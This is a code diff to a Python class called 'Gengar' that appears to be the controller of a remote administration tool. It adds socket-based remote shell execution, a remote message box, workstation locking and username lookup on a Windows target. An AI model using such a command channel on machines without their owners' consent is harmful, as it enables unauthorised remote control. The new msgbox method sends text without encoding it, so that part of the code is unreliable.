@@ -5,8 +5,9 @@ import time
 import output
 
 
-class CommandTypes(Enum):
-    SHELL = 0
+class CommandTypes:
+    SHELL = '\x00'
+    MSGBOX = '\x01'
 
 
 class Gengar:
@@ -15,14 +16,15 @@ class Gengar:
 
     def shell(self, cmd):
         print(f'Running: {cmd}')
-        pass
+        self._sock.send((CommandTypes.SHELL + cmd).encode())
+        return self._sock.recv(8192).decode().strip()
+
+    def msgbox(self, content):
+        self._sock.send(CommandTypes.MSGBOX + content)
 
     def lock_workstation(self):
         print('Locking workstation')
         self.shell('rundll32 user32.dll,LockWorkStation')
-
-    def msgbox(self, content):
-        pass
 
     def username(self):
         return self.shell('echo %username%')
